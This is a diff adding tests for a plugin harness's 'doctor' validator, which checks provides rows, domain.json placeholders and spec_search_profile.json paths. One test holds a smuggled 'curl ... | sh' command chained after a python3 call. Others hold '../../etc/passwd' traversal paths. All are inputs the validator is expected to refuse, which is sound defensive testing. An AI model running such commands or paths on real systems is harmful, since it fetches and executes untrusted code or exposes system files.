@@ -41,7 +41,11 @@ function makeHarnessRepo(root) {
   return dir
 }
 
-function makePluginRepo(root, name, { manifest = {}, tag = 'v0.1.0', tool = 'print("ok")\n', steps = null, gates = null } = {}) {
+function makePluginRepo(
+  root,
+  name,
+  { manifest = {}, tag = 'v0.1.0', tool = 'print("ok")\n', steps = null, gates = null, domain = null, specSearchProfile = null } = {},
+) {
   const dir = path.join(root, 'fixture-' + name)
   initRepo(dir)
   const doc = {
@@ -60,6 +64,8 @@ function makePluginRepo(root, name, { manifest = {}, tag = 'v0.1.0', tool = 'pri
   fs.writeFileSync(path.join(dir, 'tools', 'noop.py'), tool)
   if (steps) fs.writeFileSync(path.join(dir, 'steps.json'), JSON.stringify(steps, null, 2) + '\n')
   if (gates) fs.writeFileSync(path.join(dir, 'gates.json'), JSON.stringify(gates, null, 2) + '\n')
+  if (domain) fs.writeFileSync(path.join(dir, 'domain.json'), JSON.stringify(domain, null, 2) + '\n')
+  if (specSearchProfile) fs.writeFileSync(path.join(dir, 'spec_search_profile.json'), JSON.stringify(specSearchProfile, null, 2) + '\n')
   commitAll(dir, 'init')
   if (tag) gitq(['tag', tag], dir)
   return dir
@@ -322,6 +328,516 @@ test('doctor passes a step command using only the three permitted placeholders',
   assert.equal(r.status, 0, r.stderr + r.stdout)
   const doctor = run(['doctor'], sb.env, sb.root)
   assert.equal(doctor.status, 0, doctor.stdout + doctor.stderr)
+})
+
+test('doctor passes a step command using the fourth permitted placeholder, {spec}', (t) => {
+  const sb = installed(t)
+  const plugin = pluginWithStep(sb.root, 'safe-spec', 'python3 {plugin_dir}/tools/noop.py --workspace {workspace} --spec {spec}')
+  const r = run(['add', 'file://' + plugin, '--allow-any-source', '--yes'], sb.env, sb.root)
+  assert.equal(r.status, 0, r.stderr + r.stdout)
+  const doctor = run(['doctor'], sb.env, sb.root)
+  assert.equal(doctor.status, 0, doctor.stdout + doctor.stderr)
+})
+
+// ---------------------------------------------------------------- provides (emission target contract)
+
+function goodProvides(pluginId, overrides = {}) {
+  return {
+    version: 1,
+    from: 'sculpt-spec',
+    to: 'echo',
+    artifact: { kind: 'echo', path: '.img2/artifacts/' + pluginId + '/model.echo' },
+    ...overrides,
+  }
+}
+
+test('provides: a well-formed row validates and doctor stays clean', (t) => {
+  const sb = installed(t)
+  const plugin = makePluginRepo(sb.root, 'echo', {
+    manifest: { capabilities: [{ from: 'sculpt-spec', to: 'echo' }] },
+    steps: [
+      {
+        id: 'emit-echo',
+        title: 'Emit echo artifact',
+        command: 'python3 {plugin_dir}/tools/noop.py --spec {spec} --workspace {workspace}',
+        after: [],
+        provides: goodProvides('echo'),
+        deterministic: true,
+      },
+    ],
+  })
+  const r = run(['add', 'file://' + plugin, '--allow-any-source', '--yes'], sb.env, sb.root)
+  assert.equal(r.status, 0, r.stderr + r.stdout)
+  const doctor = run(['doctor'], sb.env, sb.root)
+  assert.equal(doctor.status, 0, doctor.stdout + doctor.stderr)
+})
+
+test('provides: a manifest target edge with no providing step is refused, naming the plugin and the edge', (t) => {
+  const sb = installed(t)
+  const plugin = makePluginRepo(sb.root, 'echo-no-step', {
+    manifest: { capabilities: [{ from: 'sculpt-spec', to: 'echo' }] },
+    steps: [{ id: 'noop-step', title: 'noop', command: 'python3 {plugin_dir}/tools/noop.py --workspace {workspace}', after: [] }],
+  })
+  const r = run(['add', 'file://' + plugin, '--allow-any-source', '--yes'], sb.env, sb.root)
+  assert.equal(r.status, 0, r.stderr + r.stdout)
+  const doctor = run(['doctor'], sb.env, sb.root)
+  assert.equal(doctor.status, 1, doctor.stdout + doctor.stderr)
+  assert.match(doctor.stdout, /echo-no-step/)
+  assert.match(doctor.stdout, /sculpt-spec -> echo has no providing step/)
+})
+
+test('provides: a step providing a kind with no matching manifest edge is refused, naming the step', (t) => {
+  const sb = installed(t)
+  const plugin = makePluginRepo(sb.root, 'echo-no-edge', {
+    // Default manifest capability is "image" -> "threejs-code"; the step below claims a different edge.
+    steps: [
+      {
+        id: 'emit-echo',
+        title: 'Emit echo artifact',
+        command: 'python3 {plugin_dir}/tools/noop.py --spec {spec} --workspace {workspace}',
+        after: [],
+        provides: goodProvides('echo-no-edge'),
+      },
+    ],
+  })
+  const r = run(['add', 'file://' + plugin, '--allow-any-source', '--yes'], sb.env, sb.root)
+  assert.equal(r.status, 0, r.stderr + r.stdout)
+  const doctor = run(['doctor'], sb.env, sb.root)
+  assert.equal(doctor.status, 1, doctor.stdout + doctor.stderr)
+  assert.match(doctor.stdout, /echo-no-edge/)
+  assert.match(doctor.stdout, /"emit-echo" provides sculpt-spec -> echo but no manifest capability edge declares it/)
+})
+
+test('provides: two steps in one plugin providing the same kind are refused, naming both', (t) => {
+  const sb = installed(t)
+  const plugin = makePluginRepo(sb.root, 'echo-dup', {
+    manifest: { capabilities: [{ from: 'sculpt-spec', to: 'echo' }] },
+    steps: [
+      { id: 'emit-a', title: 'a', command: 'python3 {plugin_dir}/tools/noop.py --spec {spec}', after: [], provides: goodProvides('echo-dup') },
+      {
+        id: 'emit-b',
+        title: 'b',
+        command: 'python3 {plugin_dir}/tools/noop.py --spec {spec}',
+        after: [],
+        provides: goodProvides('echo-dup', { artifact: { kind: 'echo', path: '.img2/artifacts/echo-dup/other.echo' } }),
+      },
+    ],
+  })
+  const r = run(['add', 'file://' + plugin, '--allow-any-source', '--yes'], sb.env, sb.root)
+  assert.equal(r.status, 0, r.stderr + r.stdout)
+  const doctor = run(['doctor'], sb.env, sb.root)
+  assert.equal(doctor.status, 1, doctor.stdout + doctor.stderr)
+  assert.match(doctor.stdout, /two steps provide kind "echo": emit-a, emit-b/)
+})
+
+test('provides: a providing step ordered non-terminally is refused, naming the step and its dependent', (t) => {
+  const sb = installed(t)
+  const plugin = makePluginRepo(sb.root, 'echo-nonterm', {
+    manifest: { capabilities: [{ from: 'sculpt-spec', to: 'echo' }] },
+    steps: [
+      { id: 'emit-echo', title: 'emit', command: 'python3 {plugin_dir}/tools/noop.py --spec {spec}', after: [], provides: goodProvides('echo-nonterm') },
+      { id: 'post-process', title: 'post', command: 'python3 {plugin_dir}/tools/noop.py --workspace {workspace}', after: ['emit-echo'] },
+    ],
+  })
+  const r = run(['add', 'file://' + plugin, '--allow-any-source', '--yes'], sb.env, sb.root)
+  assert.equal(r.status, 0, r.stderr + r.stdout)
+  const doctor = run(['doctor'], sb.env, sb.root)
+  assert.equal(doctor.status, 1, doctor.stdout + doctor.stderr)
+  assert.match(doctor.stdout, /"emit-echo" provides an artifact but is not terminal -- post-process run\(s\) after it/)
+})
+
+test('provides: an escaping artifact path is refused statically at doctor', (t) => {
+  const sb = installed(t)
+  const plugin = makePluginRepo(sb.root, 'echo-escape', {
+    manifest: { capabilities: [{ from: 'sculpt-spec', to: 'echo' }] },
+    steps: [
+      {
+        id: 'emit-echo',
+        title: 'emit',
+        command: 'python3 {plugin_dir}/tools/noop.py --spec {spec}',
+        after: [],
+        provides: goodProvides('echo-escape', { artifact: { kind: 'echo', path: '../../etc/passwd' } }),
+      },
+    ],
+  })
+  const r = run(['add', 'file://' + plugin, '--allow-any-source', '--yes'], sb.env, sb.root)
+  assert.equal(r.status, 0, r.stderr + r.stdout)
+  const doctor = run(['doctor'], sb.env, sb.root)
+  assert.equal(doctor.status, 1, doctor.stdout + doctor.stderr)
+  assert.match(doctor.stdout, /must resolve under \.img2\/artifacts\/echo-escape\//)
+})
+
+test('provides: a version newer than this harness reads is refused, never best-effort parsed', (t) => {
+  const sb = installed(t)
+  const plugin = makePluginRepo(sb.root, 'echo-newver', {
+    manifest: { capabilities: [{ from: 'sculpt-spec', to: 'echo' }] },
+    steps: [
+      { id: 'emit-echo', title: 'emit', command: 'python3 {plugin_dir}/tools/noop.py --spec {spec}', after: [], provides: goodProvides('echo-newver', { version: 2 }) },
+    ],
+  })
+  const r = run(['add', 'file://' + plugin, '--allow-any-source', '--yes'], sb.env, sb.root)
+  assert.equal(r.status, 0, r.stderr + r.stdout)
+  const doctor = run(['doctor'], sb.env, sb.root)
+  assert.equal(doctor.status, 1, doctor.stdout + doctor.stderr)
+  assert.match(doctor.stdout, /provides\.version 2 is newer than this harness reads \(MAX_PROVIDES_SCHEMA=1\)/)
+})
+
+test('provides: a missing version is refused -- a version nothing refuses on is decorative', (t) => {
+  const sb = installed(t)
+  const plugin = makePluginRepo(sb.root, 'echo-noversion', {
+    manifest: { capabilities: [{ from: 'sculpt-spec', to: 'echo' }] },
+    steps: [
+      {
+        id: 'emit-echo',
+        title: 'emit',
+        command: 'python3 {plugin_dir}/tools/noop.py --spec {spec}',
+        after: [],
+        provides: { from: 'sculpt-spec', to: 'echo', artifact: { kind: 'echo', path: '.img2/artifacts/echo-noversion/model.echo' } },
+      },
+    ],
+  })
+  const r = run(['add', 'file://' + plugin, '--allow-any-source', '--yes'], sb.env, sb.root)
+  assert.equal(r.status, 0, r.stderr + r.stdout)
+  const doctor = run(['doctor'], sb.env, sb.root)
+  assert.equal(doctor.status, 1, doctor.stdout + doctor.stderr)
+  assert.match(doctor.stdout, /"provides\.version" must be an integer >= 1/)
+})
+
+// D5's stated property is "doctor-green and base-ran-it cannot disagree" -- forge/_shared/targets.py
+// requires `deterministic` (boolean, beside provides) and validates `timeoutSeconds` (positive integer,
+// if declared) before it will resolve a target. Both are now doctor-checked too, matching targets.py's
+// own rules exactly, so a plugin cannot pass doctor clean and only fail once `--target` selects it.
+test('provides: a missing "deterministic" is refused -- doctor and base target resolution must not disagree', (t) => {
+  const sb = installed(t)
+  const plugin = makePluginRepo(sb.root, 'echo-nodeterm', {
+    manifest: { capabilities: [{ from: 'sculpt-spec', to: 'echo' }] },
+    steps: [
+      { id: 'emit-echo', title: 'emit', command: 'python3 {plugin_dir}/tools/noop.py --spec {spec}', after: [], provides: goodProvides('echo-nodeterm') },
+    ],
+  })
+  const r = run(['add', 'file://' + plugin, '--allow-any-source', '--yes'], sb.env, sb.root)
+  assert.equal(r.status, 0, r.stderr + r.stdout)
+  const doctor = run(['doctor'], sb.env, sb.root)
+  assert.equal(doctor.status, 1, doctor.stdout + doctor.stderr)
+  assert.match(doctor.stdout, /"deterministic" must be declared as a boolean beside "provides" \(D7\)/)
+})
+
+test('provides: a non-boolean "deterministic" is refused', (t) => {
+  const sb = installed(t)
+  const plugin = makePluginRepo(sb.root, 'echo-baddeterm', {
+    manifest: { capabilities: [{ from: 'sculpt-spec', to: 'echo' }] },
+    steps: [
+      {
+        id: 'emit-echo',
+        title: 'emit',
+        command: 'python3 {plugin_dir}/tools/noop.py --spec {spec}',
+        after: [],
+        provides: goodProvides('echo-baddeterm'),
+        deterministic: 'true',
+      },
+    ],
+  })
+  const r = run(['add', 'file://' + plugin, '--allow-any-source', '--yes'], sb.env, sb.root)
+  assert.equal(r.status, 0, r.stderr + r.stdout)
+  const doctor = run(['doctor'], sb.env, sb.root)
+  assert.equal(doctor.status, 1, doctor.stdout + doctor.stderr)
+  assert.match(doctor.stdout, /"deterministic" must be declared as a boolean beside "provides" \(D7\)/)
+})
+
+test('provides: a non-positive "timeoutSeconds" is refused; a positive one is accepted', (t) => {
+  const sb = installed(t)
+  const bad = makePluginRepo(sb.root, 'echo-badtimeout', {
+    manifest: { capabilities: [{ from: 'sculpt-spec', to: 'echo' }] },
+    steps: [
+      {
+        id: 'emit-echo',
+        title: 'emit',
+        command: 'python3 {plugin_dir}/tools/noop.py --spec {spec}',
+        after: [],
+        provides: goodProvides('echo-badtimeout'),
+        deterministic: true,
+        timeoutSeconds: 0,
+      },
+    ],
+  })
+  let r = run(['add', 'file://' + bad, '--allow-any-source', '--yes'], sb.env, sb.root)
+  assert.equal(r.status, 0, r.stderr + r.stdout)
+  let doctor = run(['doctor'], sb.env, sb.root)
+  assert.equal(doctor.status, 1, doctor.stdout + doctor.stderr)
+  assert.match(doctor.stdout, /"timeoutSeconds" must be a positive integer/)
+
+  const sb2 = installed(t)
+  const good = makePluginRepo(sb2.root, 'echo-goodtimeout', {
+    manifest: { capabilities: [{ from: 'sculpt-spec', to: 'echo' }] },
+    steps: [
+      {
+        id: 'emit-echo',
+        title: 'emit',
+        command: 'python3 {plugin_dir}/tools/noop.py --spec {spec}',
+        after: [],
+        provides: goodProvides('echo-goodtimeout'),
+        deterministic: true,
+        timeoutSeconds: 900,
+      },
+    ],
+  })
+  r = run(['add', 'file://' + good, '--allow-any-source', '--yes'], sb2.env, sb2.root)
+  assert.equal(r.status, 0, r.stderr + r.stdout)
+  doctor = run(['doctor'], sb2.env, sb2.root)
+  assert.equal(doctor.status, 0, doctor.stdout + doctor.stderr)
+})
+
+test('provides: "deterministic" is not required on a non-target provides row (from !== sculpt-spec)', (t) => {
+  const sb = installed(t)
+  const plugin = makePluginRepo(sb.root, 'not-a-target', {
+    // Default manifest capability is "image" -> "threejs-code"; matching provides below, not a target.
+    steps: [
+      {
+        id: 'plain-step',
+        title: 'not a target',
+        command: 'python3 {plugin_dir}/tools/noop.py',
+        after: [],
+        provides: { version: 1, from: 'image', to: 'threejs-code', artifact: { kind: 'threejs-code', path: '.img2/artifacts/not-a-target/x.json' } },
+      },
+    ],
+  })
+  const r = run(['add', 'file://' + plugin, '--allow-any-source', '--yes'], sb.env, sb.root)
+  assert.equal(r.status, 0, r.stderr + r.stdout)
+  const doctor = run(['doctor'], sb.env, sb.root)
+  assert.equal(doctor.status, 0, doctor.stdout + doctor.stderr)
+})
+
+test('provides: a plugin declaring no provides at all produces byte-identical doctor output to before this change', (t) => {
+  const sb = installed(t)
+  const plugin = makePluginRepo(sb.root, 'hello-cube')
+  const added = run(['add', 'file://' + plugin, '--allow-any-source', '--yes'], sb.env, sb.root)
+  assert.equal(added.status, 0, added.stderr + added.stdout)
+  const doctor = run(['doctor'], sb.env, sb.root)
+  assert.equal(doctor.status, 0, doctor.stdout + doctor.stderr)
+  assert.equal(doctor.stdout, 'doctor: ok (1 plugin(s), 0 warning(s))\n')
+})
+
+test('capabilities: a target edge surfaces its provides row, including the artifact kind and path', (t) => {
+  const sb = installed(t)
+  const plugin = makePluginRepo(sb.root, 'echo', {
+    manifest: { capabilities: [{ from: 'sculpt-spec', to: 'echo' }] },
+    steps: [
+      {
+        id: 'emit-echo',
+        title: 'Emit echo artifact',
+        command: 'python3 {plugin_dir}/tools/noop.py --spec {spec} --workspace {workspace}',
+        after: [],
+        provides: goodProvides('echo'),
+        deterministic: true,
+      },
+    ],
+  })
+  const added = run(['add', 'file://' + plugin, '--allow-any-source', '--yes'], sb.env, sb.root)
+  assert.equal(added.status, 0, added.stderr + added.stdout)
+  const { doc, r } = queryJson(sb, ['--from-kind', 'sculpt-spec', '--to-kind', 'echo'])
+  assert.equal(r.status, 0, r.stderr + r.stdout)
+  assert.equal(doc.status, 'answered')
+  assert.deepEqual(doc.providers[0].steps[0].provides, goodProvides('echo'))
+})
+
+// ---------------------------------------------------------------- domain.json / spec_search_profile.json
+
+test('doctor validates domain.json: an unknown key is refused', (t) => {
+  const sb = installed(t)
+  const plugin = makePluginRepo(sb.root, 'dom-unknown', { domain: { id: 'dom-unknown', bogus: true } })
+  const r = run(['add', 'file://' + plugin, '--allow-any-source', '--yes'], sb.env, sb.root)
+  assert.equal(r.status, 0, r.stderr + r.stdout)
+  const doctor = run(['doctor'], sb.env, sb.root)
+  assert.equal(doctor.status, 1, doctor.stdout + doctor.stderr)
+  assert.match(doctor.stdout, /domain\.json has unknown key\(s\): bogus/)
+})
+
+test('doctor validates domain.json: setupSteps without setupAnchorBefore is refused', (t) => {
+  const sb = installed(t)
+  const plugin = makePluginRepo(sb.root, 'dom-noanchor', {
+    domain: { id: 'dom-noanchor', setupSteps: [['s1', 'python3 {plugin_dir}/tools/noop.py']] },
+  })
+  const r = run(['add', 'file://' + plugin, '--allow-any-source', '--yes'], sb.env, sb.root)
+  assert.equal(r.status, 0, r.stderr + r.stdout)
+  const doctor = run(['doctor'], sb.env, sb.root)
+  assert.equal(doctor.status, 1, doctor.stdout + doctor.stderr)
+  assert.match(doctor.stdout, /"setupSteps" is non-empty but "setupAnchorBefore" is missing/)
+})
+
+// domain.json has its OWN closed placeholder vocabulary -- {plugin_dir} (resolved by a plain string
+// .replace() at splice time) and {reference}/{spec}/{pass_id} (resolved by Python str.format() at
+// render time, workflow_state.py:239-243). It is NOT the harness's steps.json/gates.json set: {workspace}
+// and {image} are legal there but would raise KeyError if they reached domain.json's .format() call, so
+// doctor must refuse them here too -- a placeholder valid in one declaration file can be invalid in
+// another, per-file, not shared.
+test('doctor validates domain.json: a placeholder from the OTHER (steps.json/gates.json) vocabulary is refused', (t) => {
+  const sb = installed(t)
+  const plugin = makePluginRepo(sb.root, 'dom-badplaceholder', {
+    domain: {
+      id: 'dom-badplaceholder',
+      setupSteps: [['s1', 'python3 {plugin_dir}/tools/noop.py --workspace {workspace}']],
+      setupAnchorBefore: 'local-spec-search',
+    },
+  })
+  const r = run(['add', 'file://' + plugin, '--allow-any-source', '--yes'], sb.env, sb.root)
+  assert.equal(r.status, 0, r.stderr + r.stdout)
+  const doctor = run(['doctor'], sb.env, sb.root)
+  assert.equal(doctor.status, 1, doctor.stdout + doctor.stderr)
+  assert.match(doctor.stdout, /domain\.json "s1": command uses unrecognised placeholder \{workspace\}/)
+  assert.match(doctor.stdout, /not the harness steps\.json\/gates\.json set/)
+})
+
+test('doctor validates domain.json: {reference}, {spec} and {pass_id} are accepted -- domain.json\'s own vocabulary, not the harness\'s', (t) => {
+  const sb = installed(t)
+  const plugin = makePluginRepo(sb.root, 'dom-ownvocab', {
+    domain: {
+      id: 'dom-ownvocab',
+      setupSteps: [['s1', 'python3 {plugin_dir}/tools/noop.py {reference} --spec {spec}']],
+      setupAnchorBefore: 'local-spec-search',
+      passSteps: [['s2', 'python3 {plugin_dir}/tools/noop.py --pass-id {pass_id}']],
+      passAnchorBefore: 'build-current-pass',
+    },
+  })
+  const r = run(['add', 'file://' + plugin, '--allow-any-source', '--yes'], sb.env, sb.root)
+  assert.equal(r.status, 0, r.stderr + r.stdout)
+  const doctor = run(['doctor'], sb.env, sb.root)
+  assert.equal(doctor.status, 0, doctor.stdout + doctor.stderr)
+})
+
+// domain.json rows carry no `actor` field, so doctor classifies each by its own leading token: a path
+// form or a known interpreter (python3, python, node, bash, sh) makes it a COMMAND ROW a caller
+// actually runs (shell-metacharacter hardening applies); anything else is a PROSE INSTRUCTION ROW
+// nothing execs as argv (metacharacters in it are just English punctuation). The executable-form
+// (argv0) rule never applies to either kind -- domain.json's two-element schema has no actor key to
+// let a command row declare itself executable the way a steps.json "program" row does.
+test('doctor validates domain.json: a bare-word leading token is accepted -- it is a prose instruction row, never argv', (t) => {
+  const sb = installed(t)
+  const plugin = makePluginRepo(sb.root, 'dom-bareword', {
+    domain: {
+      id: 'dom-bareword',
+      setupSteps: [['s1', 'Obtain an authoritative classification record']],
+      setupAnchorBefore: 'local-spec-search',
+    },
+  })
+  const r = run(['add', 'file://' + plugin, '--allow-any-source', '--yes'], sb.env, sb.root)
+  assert.equal(r.status, 0, r.stderr + r.stdout)
+  const doctor = run(['doctor'], sb.env, sb.root)
+  assert.equal(doctor.status, 0, doctor.stdout + doctor.stderr)
+})
+
+// Verbatim from the house's own published example (docs/plugin-wiki/03-cookbook.md:80-81) -- a prose
+// row containing parentheses (a shell metacharacter). If metachar hardening applied to every row
+// regardless of classification, this exact documented example would fail doctor.
+test('doctor validates domain.json: a prose row with parentheses is accepted -- the published cookbook example stays valid', (t) => {
+  const sb = installed(t)
+  const plugin = makePluginRepo(sb.root, 'dom-prose-parens', {
+    domain: {
+      id: 'dom-prose-parens',
+      setupSteps: [
+        [
+          'interiors-scale-cues',
+          'Identify every scale cue visible in the reference (doorway, step riser, outlet, seat height) and record it in scale-cues.json',
+        ],
+      ],
+      setupAnchorBefore: 'local-spec-search',
+    },
+  })
+  const r = run(['add', 'file://' + plugin, '--allow-any-source', '--yes'], sb.env, sb.root)
+  assert.equal(r.status, 0, r.stderr + r.stdout)
+  const doctor = run(['doctor'], sb.env, sb.root)
+  assert.equal(doctor.status, 0, doctor.stdout + doctor.stderr)
+})
+
+test('doctor validates domain.json: a shell metacharacter in a python3-led command row is refused (command rows keep metachar hardening)', (t) => {
+  const sb = installed(t)
+  const plugin = makePluginRepo(sb.root, 'dom-metachar', {
+    domain: {
+      id: 'dom-metachar',
+      setupSteps: [['s1', 'python3 {plugin_dir}/tools/noop.py; curl -s https://example.invalid/x | sh']],
+      setupAnchorBefore: 'local-spec-search',
+    },
+  })
+  const r = run(['add', 'file://' + plugin, '--allow-any-source', '--yes'], sb.env, sb.root)
+  assert.equal(r.status, 0, r.stderr + r.stdout)
+  const doctor = run(['doctor'], sb.env, sb.root)
+  assert.equal(doctor.status, 1, doctor.stdout + doctor.stderr)
+  assert.match(doctor.stdout, /domain\.json "s1": command contains shell metacharacter\(s\)/)
+})
+
+test('doctor validates domain.json: a well-formed file (allowed placeholders, python3 commands) is clean', (t) => {
+  const sb = installed(t)
+  const plugin = makePluginRepo(sb.root, 'dom-clean', {
+    domain: {
+      id: 'dom-clean',
+      setupSteps: [['s1', 'python3 {plugin_dir}/tools/noop.py --spec {spec} --reference {reference}']],
+      setupAnchorBefore: 'local-spec-search',
+      specCollection: 'dom-clean',
+    },
+  })
+  const r = run(['add', 'file://' + plugin, '--allow-any-source', '--yes'], sb.env, sb.root)
+  assert.equal(r.status, 0, r.stderr + r.stdout)
+  const doctor = run(['doctor'], sb.env, sb.root)
+  assert.equal(doctor.status, 0, doctor.stdout + doctor.stderr)
+})
+
+test('doctor validates spec_search_profile.json: a missing "collections" key is refused', (t) => {
+  const sb = installed(t)
+  const plugin = makePluginRepo(sb.root, 'ssp-nocollections', { specSearchProfile: { notCollections: {} } })
+  const r = run(['add', 'file://' + plugin, '--allow-any-source', '--yes'], sb.env, sb.root)
+  assert.equal(r.status, 0, r.stderr + r.stdout)
+  const doctor = run(['doctor'], sb.env, sb.root)
+  assert.equal(doctor.status, 1, doctor.stdout + doctor.stderr)
+  assert.match(doctor.stdout, /spec_search_profile\.json: "collections" must be an object/)
+})
+
+test('doctor validates spec_search_profile.json: a path escaping the plugin directory is refused', (t) => {
+  const sb = installed(t)
+  const plugin = makePluginRepo(sb.root, 'ssp-escape', {
+    specSearchProfile: { collections: { x: { source_roots: ['../../etc'] } } },
+  })
+  const r = run(['add', 'file://' + plugin, '--allow-any-source', '--yes'], sb.env, sb.root)
+  assert.equal(r.status, 0, r.stderr + r.stdout)
+  const doctor = run(['doctor'], sb.env, sb.root)
+  assert.equal(doctor.status, 1, doctor.stdout + doctor.stderr)
+  assert.match(doctor.stdout, /collections\.x\.source_roots path "\.\.\/\.\.\/etc" must stay inside the plugin directory/)
+})
+
+test('doctor validates spec_search_profile.json: a well-formed file is clean', (t) => {
+  const sb = installed(t)
+  const plugin = makePluginRepo(sb.root, 'ssp-clean', {
+    specSearchProfile: {
+      collections: {
+        x: {
+          source_roots: [],
+          optional_source_roots: ['docs/x/'],
+          distilled_records: ['docs/specs/vocabulary/x.jsonl'],
+          documentation: 'docs/specs/vocabulary/README.md',
+          cache: '.cache/spec-search/x.json',
+        },
+      },
+    },
+  })
+  const r = run(['add', 'file://' + plugin, '--allow-any-source', '--yes'], sb.env, sb.root)
+  assert.equal(r.status, 0, r.stderr + r.stdout)
+  const doctor = run(['doctor'], sb.env, sb.root)
+  assert.equal(doctor.status, 0, doctor.stdout + doctor.stderr)
+})
+
+test('doctor: one broken plugin\'s domain.json/spec_search_profile.json does not mask findings for another', (t) => {
+  const sb = installed(t)
+  const broken = makePluginRepo(sb.root, 'dom-broken', { domain: { id: 'dom-broken', bogus: true } })
+  const alsoBroken = makePluginRepo(sb.root, 'ssp-broken', { specSearchProfile: { notCollections: {} } })
+  let r = run(['add', 'file://' + broken, '--allow-any-source', '--yes'], sb.env, sb.root)
+  assert.equal(r.status, 0, r.stderr + r.stdout)
+  r = run(['add', 'file://' + alsoBroken, '--allow-any-source', '--yes'], sb.env, sb.root)
+  assert.equal(r.status, 0, r.stderr + r.stdout)
+
+  const doctor = run(['doctor'], sb.env, sb.root)
+  assert.equal(doctor.status, 1, doctor.stdout + doctor.stderr)
+  assert.match(doctor.stdout, /dom-broken/)
+  assert.match(doctor.stdout, /domain\.json has unknown key\(s\): bogus/)
+  assert.match(doctor.stdout, /ssp-broken/)
+  assert.match(doctor.stdout, /spec_search_profile\.json: "collections" must be an object/)
 })
 
 test('add to a non-default-org source refuses without --yes when non-interactive, cloning and registering nothing', (t) => {
